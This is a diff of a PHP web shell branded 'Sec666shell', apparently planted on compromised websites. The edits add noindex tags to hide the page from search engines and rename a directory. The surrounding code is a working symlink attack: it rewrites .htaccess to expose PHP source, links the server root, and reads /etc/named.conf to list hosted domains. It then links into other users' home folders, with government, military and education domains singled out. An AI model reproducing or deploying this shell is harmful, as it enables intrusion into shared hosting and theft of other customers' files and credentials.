@@ -1,6 +1,8 @@
 <!DOCTYPE HTML>
 <link rel="shortcut icon" href="https://i.ibb.co/f0tgWnV/1579475764733.png">
 <head>
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
 <title>‌</title>
 <link href="https://fonts.googleapis.com/css?family=Calligraffitti&display=swap" rel="stylesheet"> 
 <link href="https://fonts.googleapis.com/css?family=Federant&display=swap" rel="stylesheet">
@@ -15,8 +17,6 @@ input,select,textarea{border: 1px #000000 solid; -moz-border-radius: 5px; -webki
 h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px; padding:0px; animation:sec666 0.5s linear infinite;} @keyframes sec666{2%{color:#fff;}3%{transform:translate(2px,-10px) skewX(3240deg);}5%{transform:translate(0px,0px) skewX(0deg);}2% , 54%{transform:translateX(0px) skew(0deg);}55%{transform:translate(-2px,6px) skew(-5530deg);}56%{transform:translate(0px,0px) skew(0deg);}57%{transform:translate(4px,-10px) skew(-70deg);}58%{transform:translate(0px,0px) skew(0deg);}62%{transform:translate(0px,20px) skew(0deg);}63%{transform:translate(4px,-2px) skew(0deg);}90%{transform:translate(1px,3px); skew(-230deg);}95%{transform:translate(-7px,2px); skew(-120deg);}100%{transform:translate(0px,0px) skew(0deg);}
 </style>
 </head>
-<meta name="robots" content="noindex">
-<meta name="googlebot" content="noindex">
 <center><br><h1 style="font-family: Calligraffitti;"><font color="white">Sec666shell</font></h1></center><table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><br>
 
 
@@ -371,7 +371,7 @@ if(isset($_GET['sec']) && ($_GET['sec'] == 'symlink')) {
 	 echo " <form action= method=post>";
 @set_time_limit(0);
 echo "<center><font color='white'>";
-@mkdir('sym',0777); 
+@mkdir('Sec666_Sym',0777); 
 $htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "{ <font color='red'>Cant access this file on server { /etc/named.conf }</font> }</center>"; } else { echo "<table width='700px' border='1' cellpadding='3' cellspacing='0' align='center'><td style='background:#666;color:#000;'>Domain</td><td style='background:#666;color:#000;'>Users</td><td style='background:#666;color:#000;'>Symlink </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<font color=#D0D5D5>".$string[1][0].'</font>'; } echo " <tr> <td><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a>  </td> <td style=border-left:1px solid #52CF38;> '.$UID['name']." </td> <td style=border-left:1px solid white;> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr>"; flush(); } } } } echo "</center></table></font>"; 
 }
 
